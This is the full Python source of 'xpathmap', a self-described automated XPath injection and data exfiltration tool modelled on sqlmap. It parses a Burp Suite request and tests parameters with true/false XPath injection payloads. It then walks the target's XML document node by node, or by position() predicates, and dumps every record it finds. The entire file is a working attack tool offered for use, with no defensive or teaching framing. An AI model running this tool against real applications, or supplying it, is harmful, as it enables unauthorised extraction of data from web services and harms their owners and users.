#!/usr/bin/env python3
"""
xpathmap.py — Automated XPath Injection & Data Exfiltration Tool
Inspired by sqlmap. Reads a raw Burp Suite HTTP request file.

Usage:
    python xpathmap.py -r request.txt
    python xpathmap.py -r request.txt --method predicate
    python xpathmap.py -r request.txt --delay 0.2 --proxy http://127.0.0.1:8080
    python xpathmap.py -r request.txt --injectable-param q --node-param f
"""

import argparse
import re
import sys
import time
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urlparse, parse_qs, urlencode, urljoin

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ──────────────────────────────────────────────────────────────────────────────
# ANSI colors
# ──────────────────────────────────────────────────────────────────────────────

class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    CYAN   = "\033[96m"
    BOLD   = "\033[1m"
    RESET  = "\033[0m"

def info(msg):    print(f"{C.BLUE}[*]{C.RESET} {msg}")
def success(msg): print(f"{C.GREEN}[+]{C.RESET} {msg}")
def warn(msg):    print(f"{C.YELLOW}[!]{C.RESET} {msg}")
def error(msg):   print(f"{C.RED}[-]{C.RESET} {msg}")
def found(msg):   print(f"{C.GREEN}{C.BOLD}[FOUND]{C.RESET} {msg}")


# ──────────────────────────────────────────────────────────────────────────────
# Burp request parser
# ──────────────────────────────────────────────────────────────────────────────

@dataclass
class ParsedRequest:
    method: str
    url: str
    headers: dict
    params: dict          # GET query params  {name: value}
    body_params: dict     # POST body params  {name: value}
    raw_body: str

    @property
    def all_params(self) -> dict:
        return {**self.params, **self.body_params}


def parse_burp_request(filepath: str) -> ParsedRequest:
    """Parse a raw HTTP request file exported from Burp Suite."""
    with open(filepath, "r", errors="replace") as fh:
        content = fh.read()

    lines = content.splitlines()
    if not lines:
        error("Request file is empty.")
        sys.exit(1)

    # --- Request line ---
    request_line = lines[0].strip()
    match = re.match(r"^(GET|POST|PUT|PATCH|DELETE|HEAD|OPTIONS)\s+(\S+)\s+HTTP/[\d.]+$",
                     request_line, re.IGNORECASE)
    if not match:
        error(f"Cannot parse request line: {request_line!r}")
        sys.exit(1)

    http_method = match.group(1).upper()
    path_and_query = match.group(2)

    # --- Headers ---
    headers = {}
    host = ""
    i = 1
    while i < len(lines) and lines[i].strip():
        if ":" in lines[i]:
            key, _, val = lines[i].partition(":")
            headers[key.strip()] = val.strip()
            if key.strip().lower() == "host":
                host = val.strip()
        i += 1

    # --- Body (everything after blank line) ---
    raw_body = "\n".join(lines[i+1:]).strip() if i < len(lines) else ""

    # --- Build full URL ---
    scheme = "https" if headers.get("X-Forwarded-Proto", "").lower() == "https" else "http"
    # Detect scheme from Referer or Host patterns
    referer = headers.get("Referer", "")
    if referer.startswith("https"):
        scheme = "https"
    full_url = f"{scheme}://{host}{path_and_query}"

    parsed = urlparse(full_url)
    params = {k: v[0] for k, v in parse_qs(parsed.query, keep_blank_values=True).items()}

    # --- POST body params ---
    body_params = {}
    content_type = headers.get("Content-Type", "")
    if raw_body and "application/x-www-form-urlencoded" in content_type:
        body_params = {k: v[0] for k, v in parse_qs(raw_body, keep_blank_values=True).items()}

    # Strip Accept-Encoding to avoid compressed responses we can't read
    headers.pop("Accept-Encoding", None)
    headers.pop("Content-Length", None)

    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    return ParsedRequest(
        method=http_method,
        url=base_url,
        headers=headers,
        params=params,
        body_params=body_params,
        raw_body=raw_body,
    )


# ──────────────────────────────────────────────────────────────────────────────
# HTTP engine
# ──────────────────────────────────────────────────────────────────────────────

@dataclass
class Engine:
    req: ParsedRequest
    delay: float = 0.1
    proxies: Optional[dict] = None
    timeout: int = 15
    session: requests.Session = field(default_factory=requests.Session)

    def __post_init__(self):
        self.session.headers.update(self.req.headers)
        if self.proxies:
            self.session.proxies.update(self.proxies)
        self.session.verify = False

    def send(self, override_params: dict) -> str:
        """Send request with overridden parameters, return response text."""
        params = {**self.req.params, **override_params}
        body  = {**self.req.body_params}

        try:
            if self.req.method == "GET":
                resp = self.session.get(
                    self.req.url, params=params, timeout=self.timeout
                )
            else:
                # For POST, inject into body if the param exists there,
                # otherwise fall back to query string
                for k in override_params:
                    if k in body:
                        body[k] = override_params[k]
                resp = self.session.post(
                    self.req.url, params=params, data=body, timeout=self.timeout
                )
            time.sleep(self.delay)
            return resp.text.strip()
        except requests.RequestException as e:
            warn(f"Request error: {e}")
            return ""


# ──────────────────────────────────────────────────────────────────────────────
# Auto-detection helpers
# ──────────────────────────────────────────────────────────────────────────────

# Payloads that make the predicate universally FALSE → original query returns nothing
NULL_PAYLOADS = [
    "') and ('1'='2",
    "' and '1'='2",
    "\" and \"1\"=\"2",
    "') or ('1'='2",
]

# Payloads that make the predicate universally TRUE → original query returns data
TRUE_PAYLOADS = [
    "') or ('1'='1",
    "' or '1'='1",
    "\" or \"1\"=\"1",
]


def detect_injectable_param(engine: Engine, candidates: list[str]) -> tuple[Optional[str], Optional[str]]:
    """
    Try each candidate parameter with null/true payloads to detect which one
    is injectable.
    Returns (injectable_param, null_payload) or (None, None).
    """
    info("Auto-detecting injectable parameter...")

    # Baseline: send normal request to get a reference response
    baseline = engine.send({})
    baseline_len = len(baseline)

    for param in candidates:
        for null_pay in NULL_PAYLOADS:
            null_resp = engine.send({param: null_pay})
            # A null payload should produce an empty or significantly different response
            if len(null_resp) < baseline_len * 0.5:
                # Now confirm with a true payload
                for true_pay in TRUE_PAYLOADS:
                    true_resp = engine.send({param: true_pay})
                    if len(true_resp) >= baseline_len * 0.7:
                        success(f"Injectable parameter found: '{param}'")
                        success(f"Null payload: {null_pay!r}")
                        return param, null_pay

    return None, None


def detect_node_param(engine: Engine, inj_param: str, null_pay: str,
                      candidates: list[str]) -> tuple[Optional[str], Optional[str]]:
    """
    Detect which parameter controls the XPath node selection (the 'f' parameter).
    We look for a parameter whose value is reflected as an XPath field name.

    Strategy: inject a clearly invalid node name and check if we get an XPath error
    or empty response; then inject /*[1]/*[1]/*[1] and see if we get a meaningful result.
    """
    info("Auto-detecting node-selection parameter...")

    for param in candidates:
        # Try appending a union-style subquery
        test_val = engine.req.params.get(param) or engine.req.body_params.get(param, "")
        if not test_val:
            continue

        # Inject a subquery that should return something from any XML doc
        probe = f"{test_val} | /*[1]/*[1]/*[1]/*[1]"
        resp = engine.send({inj_param: null_pay, param: probe})
        if resp and len(resp) > 0 and resp != engine.send({inj_param: null_pay}):
            success(f"Node-selection parameter found: '{param}' (original value: '{test_val}')")
            return param, test_val

    return None, None


def get_baseline_field(engine: Engine, node_param: str) -> Optional[str]:
    """Extract the field name currently used in the node parameter value."""
    val = engine.req.params.get(node_param) or engine.req.body_params.get(node_param, "")
    # The field name is usually just the node param value itself (e.g. "fullstreetname")
    return val.strip() if val.strip() else None


# ──────────────────────────────────────────────────────────────────────────────
# XPath traversal — Node Selection method
# ──────────────────────────────────────────────────────────────────────────────

def build_path(indices: list[int]) -> str:
    return "".join(f"/*[{i}]" for i in indices)


def probe_node(engine: Engine, inj_param: str, null_pay: str,
               node_param: str, field: str, indices: list[int]) -> str:
    """Send a probe for a specific node path. Returns response text."""
    path = build_path(indices)
    f_val = f"{field} | {path}"
    return engine.send({inj_param: null_pay, node_param: f_val})


def detect_depth(engine: Engine, inj_param: str, null_pay: str,
                 node_param: str, field: str,
                 dataset_idx: int, max_depth: int = 8) -> Optional[int]:
    """
    Determine schema depth for a given dataset index.
    Returns total depth (number of /*[N] levels) or None if dataset not found.
    """
    base = [1, dataset_idx]
    for extra in range(1, max_depth + 1):
        indices = base + [1] * extra
        resp = probe_node(engine, inj_param, null_pay, node_param, field, indices)
        if resp:
            depth = len(indices)
            info(f"    Depth detected: {depth}  (response: '{resp[:60]}')")
            return depth
    return None


def exfiltrate_record(engine: Engine, inj_param: str, null_pay: str,
                      node_param: str, field: str,
                      base_indices: list[int], max_fields: int = 20) -> list[str]:
    """Extract all fields for one record. base_indices ends at the record level."""
    values = []
    for field_idx in range(1, max_fields + 1):
        resp = probe_node(engine, inj_param, null_pay, node_param, field,
                          base_indices + [field_idx])
        if not resp:
            break
        values.append(resp)
    return values


def exfiltrate_dataset(engine: Engine, inj_param: str, null_pay: str,
                       node_param: str, field: str, dataset_idx: int,
                       max_depth: int, max_records: int, max_fields: int) -> list[list[str]]:
    """Extract all records from a dataset."""
    print()
    info(f"Scanning dataset /*[1]/*[{dataset_idx}] ...")

    depth = detect_depth(engine, inj_param, null_pay, node_param, field,
                         dataset_idx, max_depth)
    if depth is None:
        warn(f"    Dataset /*[1]/*[{dataset_idx}] not found or empty.")
        return []

    # Structure: [1, dataset_idx, intermediate..., record_idx]
    # intermediate = depth - 3 levels of /*[1]
    n_intermediate = depth - 3
    if n_intermediate < 0:
        warn("    Depth too shallow for record extraction.")
        return []

    intermediate = [1] * n_intermediate
    records = []

    for rec_idx in range(1, max_records + 1):
        base = [1, dataset_idx] + intermediate + [rec_idx]
        record = exfiltrate_record(engine, inj_param, null_pay, node_param,
                                   field, base, max_fields)
        if not record:
            info(f"    No more records at index {rec_idx}. Dataset done.")
            break
        found(f"Record {rec_idx:>3}: {' | '.join(record)}")
        records.append(record)

    return records


def run_node_selection(engine: Engine, inj_param: str, null_pay: str,
                       node_param: str, field: str,
                       max_datasets: int, max_depth: int,
                       max_records: int, max_fields: int) -> dict[int, list[list[str]]]:
    """Full XML document traversal via node selection injection."""
    all_data: dict[int, list[list[str]]] = {}

    info(f"Starting node-selection exfiltration  (field='{field}')")
    info(f"Parameters: injectable='{inj_param}'  node='{node_param}'")

    consecutive_empty = 0
    for ds_idx in range(1, max_datasets + 1):
        records = exfiltrate_dataset(
            engine, inj_param, null_pay, node_param, field, ds_idx,
            max_depth, max_records, max_fields
        )
        if records:
            all_data[ds_idx] = records
            consecutive_empty = 0
        else:
            consecutive_empty += 1
            if consecutive_empty >= 2:
                info("Two consecutive empty datasets — stopping scan.")
                break

    return all_data


# ──────────────────────────────────────────────────────────────────────────────
# XPath traversal — Predicate method
# ──────────────────────────────────────────────────────────────────────────────

def run_predicate(engine: Engine, inj_param: str, step: int,
                  max_records: int) -> list[str]:
    """Extract data by incrementing position() threshold in the predicate."""
    info(f"Starting predicate exfiltration via position()  (param='{inj_param}', step={step})")
    results: list[str] = []
    position = 0

    while position < max_records:
        payload = f"') and (position()>{position}) and ('1'='1"
        resp = engine.send({inj_param: payload})

        if not resp:
            info(f"    No data at position()>{position}. Done.")
            break

        batch = [ln.strip() for ln in resp.splitlines() if ln.strip()]
        results.extend(batch)
        found(f"position()>{position}: {batch}")
        position += step

    return results


# ──────────────────────────────────────────────────────────────────────────────
# Output
# ──────────────────────────────────────────────────────────────────────────────

def print_summary(data):
    print()
    print(f"{C.BOLD}{'='*60}{C.RESET}")
    print(f"{C.BOLD}  EXTRACTION RESULTS{C.RESET}")
    print(f"{C.BOLD}{'='*60}{C.RESET}")

    if isinstance(data, dict):
        total = sum(len(v) for v in data.values())
        print(f"  Datasets: {len(data)}   Total records: {total}")
        for ds_idx, records in data.items():
            print(f"\n  {C.CYAN}Dataset [{ds_idx}]{C.RESET}  —  {len(records)} records")
            print(f"  {'-'*50}")
            for i, rec in enumerate(records, 1):
                print(f"    [{i:>3}]  {' | '.join(rec)}")
    elif isinstance(data, list):
        print(f"  Total items: {len(data)}")
        print(f"  {'-'*50}")
        for i, item in enumerate(data, 1):
            print(f"    [{i:>3}]  {item}")

    print(f"{C.BOLD}{'='*60}{C.RESET}")


# ──────────────────────────────────────────────────────────────────────────────
# CLI
# ──────────────────────────────────────────────────────────────────────────────

BANNER = f"""{C.CYAN}{C.BOLD}
  ██╗  ██╗██████╗  █████╗ ████████╗██╗  ██╗███╗   ███╗ █████╗ ██████╗
  ╚██╗██╔╝██╔══██╗██╔══██╗╚══██╔══╝██║  ██║████╗ ████║██╔══██╗██╔══██╗
   ╚███╔╝ ██████╔╝███████║   ██║   ███████║██╔████╔██║███████║██████╔╝
   ██╔██╗ ██╔═══╝ ██╔══██║   ██║   ██╔══██║██║╚██╔╝██║██╔══██║██╔═══╝
  ██╔╝ ██╗██║     ██║  ██║   ██║   ██║  ██║██║ ╚═╝ ██║██║  ██║██║
  ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝
{C.RESET}{C.YELLOW}  Automated XPath Injection & Data Exfiltration Tool{C.RESET}
"""


def parse_args():
    parser = argparse.ArgumentParser(
        description="xpathmap — XPath injection tool (sqlmap-style, reads Burp requests)"
    )
    parser.add_argument("-r", "--request", required=True,
                        help="Path to raw Burp Suite HTTP request file")
    parser.add_argument("--method", choices=["auto", "node_selection", "predicate"],
                        default="auto",
                        help="Injection method (default: auto-detect)")
    parser.add_argument("--injectable-param", default=None,
                        help="Force a specific injectable parameter (skip auto-detect)")
    parser.add_argument("--node-param", default=None,
                        help="Force node-selection parameter (the 'f'-like param)")
    parser.add_argument("--field", default=None,
                        help="XPath field name used in node param (auto-detected if not set)")
    parser.add_argument("--null-payload", default=None,
                        help="Force null payload string (skip auto-detect)")
    parser.add_argument("--delay", type=float, default=0.1,
                        help="Delay between requests in seconds (default: 0.1)")
    parser.add_argument("--proxy", default=None,
                        help="HTTP proxy URL (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--timeout", type=int, default=15,
                        help="Request timeout in seconds (default: 15)")
    parser.add_argument("--max-datasets", type=int, default=6,
                        help="Max number of datasets to scan (default: 6)")
    parser.add_argument("--max-depth", type=int, default=8,
                        help="Max schema depth to probe (default: 8)")
    parser.add_argument("--max-records", type=int, default=200,
                        help="Max records per dataset (default: 200)")
    parser.add_argument("--max-fields", type=int, default=20,
                        help="Max fields per record (default: 20)")
    parser.add_argument("--predicate-step", type=int, default=5,
                        help="position() increment step for predicate method (default: 5)")
    return parser.parse_args()


def main():
    print(BANNER)
    args = parse_args()

    # ── Parse request file ────────────────────────────────────────────────────
    info(f"Loading request from: {args.request}")
    req = parse_burp_request(args.request)
    info(f"Target  : {req.url}")
    info(f"Method  : {req.method}")
    info(f"Params  : {list(req.all_params.keys())}")

    if not req.all_params:
        error("No parameters found in the request. Cannot inject.")
        sys.exit(1)

    # ── Build engine ──────────────────────────────────────────────────────────
    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None
    engine = Engine(req=req, delay=args.delay, proxies=proxies, timeout=args.timeout)

    param_candidates = list(req.all_params.keys())

    # ── Detect injectable parameter ───────────────────────────────────────────
    if args.injectable_param and args.null_payload:
        inj_param = args.injectable_param
        null_pay  = args.null_payload
        success(f"Using forced injectable param: '{inj_param}'")
    elif args.injectable_param:
        inj_param = args.injectable_param
        # Still need null payload
        _, null_pay = detect_injectable_param(engine, [inj_param])
        if not null_pay:
            error("Could not determine null payload for the forced parameter.")
            sys.exit(1)
    else:
        inj_param, null_pay = detect_injectable_param(engine, param_candidates)
        if not inj_param:
            error("No injectable XPath parameter detected. Try --injectable-param manually.")
            sys.exit(1)

    # ── Choose method ─────────────────────────────────────────────────────────
    method = args.method

    if method == "auto":
        # Try to find a node-selection parameter — if found, use node_selection
        remaining = [p for p in param_candidates if p != inj_param]
        if remaining:
            method = "node_selection"
        else:
            info("Only one parameter found — falling back to predicate method.")
            method = "predicate"

    # ── Node-selection method ─────────────────────────────────────────────────
    if method == "node_selection":
        node_param = args.node_param
        field_name = args.field

        if not node_param:
            remaining = [p for p in param_candidates if p != inj_param]
            if not remaining:
                warn("No second parameter for node selection found. Switching to predicate.")
                method = "predicate"
            else:
                node_param, _ = detect_node_param(
                    engine, inj_param, null_pay, remaining
                )
                if not node_param:
                    warn("Could not auto-detect node-selection parameter.")
                    if len(remaining) == 1:
                        node_param = remaining[0]
                        warn(f"Assuming '{node_param}' is the node-selection parameter.")
                    else:
                        warn("Switching to predicate method.")
                        method = "predicate"

        if method == "node_selection":
            if not field_name and node_param:
                field_name = get_baseline_field(engine, node_param)
                if field_name:
                    info(f"Using field name: '{field_name}'")
                else:
                    field_name = "text()"
                    warn(f"Could not detect field name, using '{field_name}'")

    # ── Run extraction ────────────────────────────────────────────────────────
    print()
    info(f"Starting extraction using method: {C.BOLD}{method}{C.RESET}")

    if method == "node_selection":
        data = run_node_selection(
            engine, inj_param, null_pay, node_param, field_name,
            args.max_datasets, args.max_depth, args.max_records, args.max_fields
        )
    else:
        data = run_predicate(engine, inj_param, args.predicate_step, args.max_records)

    # ── Summary ───────────────────────────────────────────────────────────────
    print_summary(data)


if __name__ == "__main__":
    main()
